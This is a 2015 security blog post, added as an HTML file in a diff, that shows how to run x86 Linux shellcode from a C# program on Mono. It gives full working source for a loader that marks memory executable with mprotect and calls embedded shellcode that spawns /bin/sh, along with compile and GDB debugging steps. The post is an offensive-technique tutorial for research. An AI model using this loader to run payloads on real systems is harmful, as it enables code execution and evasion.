@@ -1,0 +1,273 @@
+<!DOCTYPE html>
+<!--[if lt IE 7]>      <html class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]-->
+<!--[if IE 7]>         <html class="no-js lt-ie9 lt-ie8"> <![endif]-->
+<!--[if IE 8]>         <html class="no-js lt-ie9"> <![endif]-->
+<!--[if gt IE 8]><!--> <html class="no-js"> <!--<![endif]-->
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+        <title>    Executing shellcode from C# on Linux
+</title>
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <link rel="stylesheet" href="http://www.wryway.com/theme/css/cid.css">
+        <link href="http://www.wryway.com/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="Security Nomad Atom Feed" />
+        
+ 
+        <link rel="apple-touch-icon" sizes="57x57" href="/icons/apple-touch-icon-57x57.png">
+        <link rel="apple-touch-icon" sizes="60x60" href="/icons/apple-touch-icon-60x60.png">
+        <link rel="apple-touch-icon" sizes="72x72" href="/icons/apple-touch-icon-72x72.png">
+        <link rel="apple-touch-icon" sizes="76x76" href="/icons/apple-touch-icon-76x76.png">
+        <link rel="apple-touch-icon" sizes="114x114" href="/icons/apple-touch-icon-114x114.png">
+        <link rel="apple-touch-icon" sizes="120x120" href="/icons/apple-touch-icon-120x120.png">
+        <link rel="apple-touch-icon" sizes="144x144" href="/icons/apple-touch-icon-144x144.png">
+        <link rel="apple-touch-icon" sizes="152x152" href="/icons/apple-touch-icon-152x152.png">
+        <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon-180x180.png">
+        <link rel="icon" type="image/png" href="/icons/favicon-32x32.png" sizes="32x32">
+        <link rel="icon" type="image/png" href="/icons/favicon-194x194.png" sizes="194x194">
+        <link rel="icon" type="image/png" href="/icons/favicon-96x96.png" sizes="96x96">
+        <link rel="icon" type="image/png" href="/icons/android-chrome-192x192.png" sizes="192x192">
+        <link rel="icon" type="image/png" href="/icons/favicon-16x16.png" sizes="16x16">
+        <link rel="manifest" href="/icons/manifest.json">
+        <link rel="shortcut icon" href="/icons/favicon.ico">
+        <meta name="msapplication-TileColor" content="#ffffff">
+        <meta name="msapplication-TileImage" content="/icons/mstile-144x144.png">
+        <meta name="msapplication-config" content="/icons/browserconfig.xml">
+        <meta name="theme-color" content="#ffffff">
+    </head>
+    <body>
+        <!--[if lt IE 7]>
+            <p class="chromeframe">You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> or <a href="http://www.google.com/chromeframe/?redirect=true">activate Google Chrome Frame</a> to improve your experience.</p>
+        <![endif]-->
+
+            <div class="container">
+
+<header class="blog-header">
+    <h1><a href="http://www.wryway.com/blog/">Security Nomad</a></h1>
+    <p> Wandering the cyber security realm </p>
+    <nav>
+        <a href="http://www.wryway.com/categories/">CATEGORIES</a>
+        <a href="http://www.wryway.com/tags/">TAGS</a>
+        <a href="http://www.wryway.com/archives/">ARCHIVES</a>
+    </nav>
+</header>
+
+    <div class="post">
+
+        <header>
+            <h1>Executing shellcode from C# on Linux</h1>
+            <p class="category">
+                Category: <a class="category" href="http://www.wryway.com/category/exploit-development/"><b>Exploit development</b></a>
+            </p>
+            <p class="date">
+                Written on <time datetime="2015-10-11T19:00:00-04:00">Oct 11, 2015</time>
+            </p>
+        </header>
+
+        <article>
+            <p>In this post I will show you how to run shellcode from a C# application on Linux. I realize that unlike, say, Python, <a href="http://www.mono-project.com/">Mono</a> is not present on most vanilla Linux installations. So there are not many cases when you will be able to leverage this ability. But it is out there and you never know what you can run into in the wild. With that being said let's first install Mono.</p>
+<h1>Mono installation</h1>
+<p>I am using a freshly downloaded <a href="https://www.offensive-security.com/kali-linux-vmware-arm-image-download/">x86 Kali image</a> here. After upgrading and changing the default password I followed the <a href="http://www.mono-project.com/docs/getting-started/install/linux/">installation instructions</a> found in official Mono documentation:</p>
+<div class="highlight"><pre><span class="c"># Become root if you aren&#39;t</span>
+su - root
+<span class="c"># Add mono-project packages signing key so all packages you pull from their repo are trusted</span>
+apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv-keys 3FA7E0328081BFF6A14DA29AA6A19B38D3D831EF
+<span class="c">#  Add mono-project repositories</span>
+<span class="nb">echo</span> <span class="s2">&quot;deb http://download.mono-project.com/repo/debian wheezy main&quot;</span> <span class="p">|</span> tee /etc/apt/sources.list.d/mono-xamarin.list
+<span class="nb">echo</span> <span class="s2">&quot;deb http://download.mono-project.com/repo/debian wheezy-libjpeg62-compat main&quot;</span> <span class="p">|</span> tee -a /etc/apt/sources.list.d/mono-xamarin.list
+<span class="c"># Update your package index</span>
+apt-get update
+<span class="c"># Install Mono-related packages</span>
+apt-get install mono-complete monodevelop
+</pre></div>
+
+
+<p>The first added repository is for getting the latest and greatest version of Mono and the second on is to satisfy <em>libgdiplus</em> dependency on Debian 8.0 and later. Installation of the <a href="http://www.monodevelop.com/">MonoDevelop IDE</a> is optional. But it is more convenient to debug you C# code in an IDE instead of a command line.</p>
+<h1>Windows prototype and Linux port</h1>
+<p>While researching the issue I came across a wonderful post that provided a working example of <a href="https://maxxor.org/posts/execute-native-x86-shellcode-in-csharp">shellcode execution in C# on Windows</a>. The example uses WinAPI <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa366898(v=vs.85).aspx">VirtualProtect</a> function to make the shellcode containing region of memory executable. Linux analog of VirtualProtect function is <a href="http://linux.die.net/man/2/mprotect">mprotect</a>. Both VirtualProtect and mprotect change protection on pages, not on arbitrary regions of memory. So even if you shellcode takes only 21 bytes, the whole page containing the code will have to be made executable. The difference between VirtaulProtect and mprotect is in that that to the first one you don't have to pass the base address of the page containing shellcode; you can just <a href="http://stackoverflow.com/questions/10838902/does-virtualprotect-require-the-address-of-the-beginning-of-the-page">pass the shellcode address</a>. And to the second one you must pass the base address of the page containing the shellcode.</p>
+<p>Here comes the source:</p>
+<div class="highlight"><pre><span class="k">using</span> <span class="nn">System</span><span class="p">;</span>
+<span class="k">using</span> <span class="nn">System.Runtime.InteropServices</span><span class="p">;</span>
+<span class="k">using</span> <span class="nn">Mono.Unix.Native</span><span class="p">;</span>
+
+<span class="k">class</span> <span class="nc">MainClass</span>
+<span class="p">{</span>
+    <span class="k">private</span> <span class="k">static</span> <span class="n">String</span> <span class="n">shellcode</span> <span class="p">=</span> <span class="s">&quot;\x31\xc9\xf7\xe1\x51\x68\x6e\x2f\x73\x68&quot;</span> <span class="p">+</span>
+        <span class="s">&quot;\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80&quot;</span><span class="p">;</span>
+
+    <span class="k">private</span> <span class="k">static</span> <span class="n">Int32</span> <span class="n">PAGE_SIZE</span> <span class="p">=</span> 
+        <span class="p">(</span><span class="n">Int32</span><span class="p">)</span><span class="n">Mono</span><span class="p">.</span><span class="n">Unix</span><span class="p">.</span><span class="n">Native</span><span class="p">.</span><span class="n">Syscall</span><span class="p">.</span><span class="n">sysconf</span><span class="p">(</span><span class="n">SysconfName</span><span class="p">.</span><span class="n">_SC_PAGESIZE</span><span class="p">);</span>
+
+    <span class="k">private</span> <span class="k">static</span> <span class="k">void</span> <span class="nf">Main</span><span class="p">(</span><span class="kt">string</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">ExecShellcode</span><span class="p">();</span>
+    <span class="p">}</span>
+
+    <span class="k">private</span> <span class="k">static</span> <span class="n">IntPtr</span> <span class="nf">GetPageBaseAddress</span><span class="p">(</span><span class="n">IntPtr</span> <span class="n">p</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="k">return</span> <span class="p">(</span><span class="n">IntPtr</span><span class="p">)((</span><span class="n">Int32</span><span class="p">)</span><span class="n">p</span> <span class="p">&amp;</span> <span class="p">~(</span><span class="n">PAGE_SIZE</span> <span class="p">-</span> <span class="m">1</span><span class="p">));</span>
+    <span class="p">}</span>
+
+    <span class="k">private</span> <span class="k">static</span> <span class="k">void</span> <span class="nf">MakeMemoryExecutable</span><span class="p">(</span><span class="n">IntPtr</span> <span class="n">pagePtr</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="kt">var</span> <span class="n">mprotectResult</span> <span class="p">=</span> <span class="n">Syscall</span><span class="p">.</span><span class="n">mprotect</span> <span class="p">(</span><span class="n">pagePtr</span><span class="p">,</span> <span class="p">(</span><span class="kt">ulong</span><span class="p">)</span><span class="n">PAGE_SIZE</span><span class="p">,</span> 
+            <span class="n">MmapProts</span><span class="p">.</span><span class="n">PROT_EXEC</span> <span class="p">|</span> <span class="n">MmapProts</span><span class="p">.</span><span class="n">PROT_WRITE</span><span class="p">);</span>
+
+        <span class="k">if</span> <span class="p">(</span><span class="n">mprotectResult</span> <span class="p">!=</span> <span class="m">0</span><span class="p">)</span> 
+        <span class="p">{</span>
+            <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span> <span class="p">(</span><span class="s">&quot;Error: mprotect failed to make page at 0x{0} &quot;</span> <span class="p">+</span>
+                <span class="s">&quot;address executable! Result: {1}, Errno: {2}&quot;</span><span class="p">,</span> <span class="n">mprotectResult</span><span class="p">,</span> 
+                <span class="n">Syscall</span><span class="p">.</span><span class="n">GetLastError</span> <span class="p">());</span>
+            <span class="n">Environment</span><span class="p">.</span><span class="n">Exit</span> <span class="p">(</span><span class="m">1</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="k">private</span> <span class="k">delegate</span> <span class="k">void</span> <span class="nf">ShellcodeFuncPrototype</span><span class="p">();</span>
+
+    <span class="k">private</span> <span class="k">static</span> <span class="k">void</span> <span class="nf">ExecShellcode</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="c1">// Convert shellcode string to byte array</span>
+        <span class="n">Byte</span><span class="p">[]</span> <span class="n">sc_bytes</span> <span class="p">=</span> <span class="k">new</span> <span class="n">Byte</span><span class="p">[</span><span class="n">shellcode</span><span class="p">.</span><span class="n">Length</span><span class="p">];</span>
+        <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span> <span class="n">i</span> <span class="p">&lt;</span> <span class="n">shellcode</span><span class="p">.</span><span class="n">Length</span><span class="p">;</span> <span class="n">i</span><span class="p">++)</span> 
+        <span class="p">{</span>
+            <span class="n">sc_bytes</span> <span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="p">=</span> <span class="p">(</span><span class="n">Byte</span><span class="p">)</span> <span class="n">shellcode</span> <span class="p">[</span><span class="n">i</span><span class="p">];</span>
+        <span class="p">}</span>
+
+        <span class="c1">// Prevent garbage collector from moving the shellcode byte array</span>
+        <span class="n">GCHandle</span> <span class="n">pinnedByteArray</span> <span class="p">=</span> <span class="n">GCHandle</span><span class="p">.</span><span class="n">Alloc</span><span class="p">(</span><span class="n">sc_bytes</span><span class="p">,</span> <span class="n">GCHandleType</span><span class="p">.</span><span class="n">Pinned</span><span class="p">);</span>
+
+        <span class="c1">// Get handle for shellcode address and address of the page it is located in</span>
+        <span class="n">IntPtr</span> <span class="n">shellcodePtr</span> <span class="p">=</span> <span class="n">pinnedByteArray</span><span class="p">.</span><span class="n">AddrOfPinnedObject</span><span class="p">();</span>
+        <span class="n">IntPtr</span> <span class="n">shellcodePagePtr</span> <span class="p">=</span> <span class="n">GetPageBaseAddress</span><span class="p">(</span><span class="n">shellcodePtr</span><span class="p">);</span>
+        <span class="n">Int32</span> <span class="n">shellcodeOffset</span> <span class="p">=</span> <span class="p">(</span><span class="n">Int32</span><span class="p">)</span><span class="n">shellcodePtr</span> <span class="p">-</span> <span class="p">(</span><span class="n">Int32</span><span class="p">)</span><span class="n">shellcodePagePtr</span><span class="p">;</span>
+        <span class="n">Int32</span> <span class="n">shellcodeLen</span> <span class="p">=</span> <span class="n">sc_bytes</span><span class="p">.</span><span class="n">GetLength</span> <span class="p">(</span><span class="m">0</span><span class="p">);</span>
+
+        <span class="c1">// Some debugging information</span>
+        <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span> <span class="p">(</span><span class="s">&quot;Page Size: {0}&quot;</span><span class="p">,</span> <span class="n">PAGE_SIZE</span><span class="p">.</span><span class="n">ToString</span> <span class="p">());</span>
+        <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span> <span class="p">(</span><span class="s">&quot;Shellcode address: 0x{0}&quot;</span><span class="p">,</span> <span class="n">shellcodePtr</span><span class="p">.</span><span class="n">ToString</span><span class="p">(</span><span class="s">&quot;x&quot;</span><span class="p">));</span>
+        <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span> <span class="p">(</span><span class="s">&quot;First page start address: 0x{0}&quot;</span><span class="p">,</span> 
+            <span class="n">shellcodePagePtr</span><span class="p">.</span><span class="n">ToString</span><span class="p">(</span><span class="s">&quot;x&quot;</span><span class="p">));</span>
+        <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span> <span class="p">(</span><span class="s">&quot;Shellcode offset: {0}&quot;</span><span class="p">,</span> <span class="n">shellcodeOffset</span><span class="p">);</span>
+        <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span> <span class="p">(</span><span class="s">&quot;Shellcode length: {0}&quot;</span><span class="p">,</span> <span class="n">shellcodeLen</span><span class="p">);</span>
+
+        <span class="c1">// Make shellcode memory executable</span>
+        <span class="n">MakeMemoryExecutable</span><span class="p">(</span><span class="n">shellcodePagePtr</span><span class="p">);</span>
+
+        <span class="c1">// Check if shellcode spans across more than 1 page; make all extra pages</span>
+        <span class="c1">// executable too</span>
+        <span class="n">Int32</span> <span class="n">pageCounter</span> <span class="p">=</span> <span class="m">1</span><span class="p">;</span>
+        <span class="k">while</span> <span class="p">(</span><span class="n">shellcodeOffset</span> <span class="p">+</span> <span class="n">shellcodeLen</span> <span class="p">&gt;</span> <span class="n">PAGE_SIZE</span><span class="p">)</span> 
+        <span class="p">{</span>
+            <span class="n">shellcodePagePtr</span> <span class="p">=</span> 
+                <span class="n">GetPageBaseAddress</span><span class="p">(</span><span class="n">shellcodePtr</span> <span class="p">+</span> <span class="n">pageCounter</span> <span class="p">*</span> <span class="n">PAGE_SIZE</span><span class="p">);</span>
+            <span class="n">pageCounter</span><span class="p">++;</span>
+            <span class="n">shellcodeLen</span> <span class="p">-=</span> <span class="n">PAGE_SIZE</span><span class="p">;</span>
+
+            <span class="n">MakeMemoryExecutable</span><span class="p">(</span><span class="n">shellcodePagePtr</span><span class="p">);</span>
+        <span class="p">}</span>
+
+        <span class="c1">// Debug information</span>
+        <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span> <span class="p">(</span><span class="s">&quot;Pages taken by the shellcode: {0}&quot;</span><span class="p">,</span>
+            <span class="n">pageCounter</span><span class="p">);</span>
+
+        <span class="c1">// Make shellcode callable by converting pointer to delegate</span>
+        <span class="n">ShellcodeFuncPrototype</span> <span class="n">shellcode_func</span> <span class="p">=</span> 
+            <span class="p">(</span><span class="n">ShellcodeFuncPrototype</span><span class="p">)</span> <span class="n">Marshal</span><span class="p">.</span><span class="n">GetDelegateForFunctionPointer</span><span class="p">(</span>
+                <span class="n">shellcodePtr</span><span class="p">,</span> <span class="k">typeof</span><span class="p">(</span><span class="n">ShellcodeFuncPrototype</span><span class="p">));</span>
+
+        <span class="n">shellcode_func</span><span class="p">();</span> <span class="c1">// Execute shellcode</span>
+
+        <span class="n">pinnedByteArray</span><span class="p">.</span><span class="n">Free</span><span class="p">();</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</pre></div>
+
+
+<p>The main logic in the above code is located in the <code>ExecShellcode()</code> function. The first thing it does is it converts shellcode string to byte array. Then it tells the garbage collector to not disturb that byte array with memory relocations. After that the code gets base address of the first page containing the shellcode and sets executable permissions on it. The code also takes care of an unlikely event of having a large shellcode that takes up memory belonging to two or more pages. And finally pointer to the shellcode is casted to a C# function and called.</p>
+<p>The shellcode used in the source is an x86 Linux shellcode that starts <em>/bin/sh</em>.</p>
+<p>The PAGE_SIZE constant used in the code is, by default, equal to 4096 bytes in Linux. The exact value is determined in runtime.</p>
+<p>To compile the above source you must reference the standard <em>Mono.Posix.dll</em> assembly; used in the project <code>Mono.Unix.Native</code> namespace lives there:</p>
+<div class="highlight"><pre>mcs /reference:Mono.Posix scframe.cs
+</pre></div>
+
+
+<p>After running the resulted executable</p>
+<div class="highlight"><pre>./scframe.exe
+</pre></div>
+
+
+<p>we should see the following output:</p>
+<p><img alt="Shellcode running output" src="http://www.wryway.com/blog/shellcode-in-csharp-on-linux/csharp-shellcode-running-output.png" title="Shellcode running output" />
+<div class="img-caption">Shellcode running output</div></p>
+<p>Alternatively to referencing the Mono.Posix.dll assembly we could directly reference <code>mprotect()</code> and <code>sysconf()</code> functions from <em>libc.so</em> library. In that case we should remember that library name passed to the <code>DllImport</code> attribute should be either <em>libc</em> or <em>libc.so.6</em> (or whatever version is current). Passing <em>libc.so</em> will produce the <em>Mono: DllImport error loading library</em> error. One inconvenience of not using the <code>Mono.Posix.dll</code> namespace is that it is not possible (at least I didn't find how) to reference the standard C global <code>errno</code> variable to get the error code of the last libc failed function. Overall there is no benefit of using this version instead of the given above. Both versions of the source can be found in the <a href="http://www.wryway.com/blog/shellcode-in-csharp-on-linux/scframe.zip">accompanying archive</a>.</p>
+<h1>Debugging</h1>
+<p>Lastly I want to share a few tips for debugging C# executables in Linux. </p>
+<p>For that purpose I primarily used MonoDevelop and GDB. High-level debugging with MonoDevelop was a no-brainer. It was a bit more involed with GDB.</p>
+<p>I found two ways of inserting breakpoints using GDB:</p>
+<ul>
+<li>By inserting the <code>\CC</code> byte in the beginning of the shellcode, which corresponds to <code>int3</code> Assembly mnemonic. I used this to catch the moment of passing execution flow to the shellcode.</li>
+<li>By setting a breakpoint on a method name as described in <a href="http://www.mono-project.com/docs/debug+profile/debug/#debugging-with-gdb">Mono documentation</a>:</li>
+</ul>
+<div class="highlight"><pre><span class="nb">echo</span> <span class="s1">&#39;handle SIGXCPU SIG33 SIG35 SIGPWR nostop noprint&#39;</span> &gt; mono-gdb-settings
+gdb -x mono-gdb-settings mono
+<span class="o">(</span>gdb<span class="o">)</span> run --debug --break <span class="s2">&quot;MainClass:Main&quot;</span> scframe.exe
+</pre></div>
+
+
+<p>To set a breakpoint on a particular line I ended up moving it and a few lines that followed into a separate method and then calling that method from where I had plucked out those lines. Then I was setting a breakpoint on the newly created method name and debugged it that way.</p>
+        </article>
+
+        <footer>
+            <p>
+                Tags:  
+ 
+                    <a class="tag" href="/tag/c-sharp/">C-Sharp</a>
+ 
+                    <a class="tag" href="/tag/linux/">Linux</a>
+            </p>
+        </footer>
+
+<div class="comments">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = 'wryway';
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+    </div>
+
+
+<footer class="blog-footer">
+
+    <ul class="nav">
+                <li><a href="http://www.wryway.com/blog/">Blog</a></li>
+            <li><a href="https://github.com/reider-roque">Github</h3>
+            </a></li>
+            <li><a href="https://linkedin.com/in/olegmi">Linkedin</h3>
+            </a></li>
+    <script type="text/javascript">
+        // JS ROT13 by http://techblog.tilllate.com/2008/07/20/ten-methods-to-obfuscate-e-mail-addresses-compared/
+        document.write( "<yv><n uers=\"znvygb:byrt@jeljnl.pbz\" ery=\"absbyybj\">Rznvy</n></yv>".replace(/[a-zA-Z]/g, function(c){return String.fromCharCode((c<="Z"?90:122)>=(c=c.charCodeAt(0)+13)?c:c-26);}));
+    </script>
+    </ul>
+
+    <p class="disclaimer">
+    Oleg Mitrofanov &copy; 2015
+    </p>
+</footer>
+            </div>
+<script>
+    var _gaq=[['_setAccount','UA-68669065-1'],['_trackPageview']];
+    (function(d,t){var g=d.createElement(t),s=d.getElementsByTagName(t)[0];
+    g.src=('https:'==location.protocol?'//ssl':'//www')+'.google-analytics.com/ga.js';
+    s.parentNode.insertBefore(g,s)}(document,'script'));
+</script>
+    </body>
+</html>
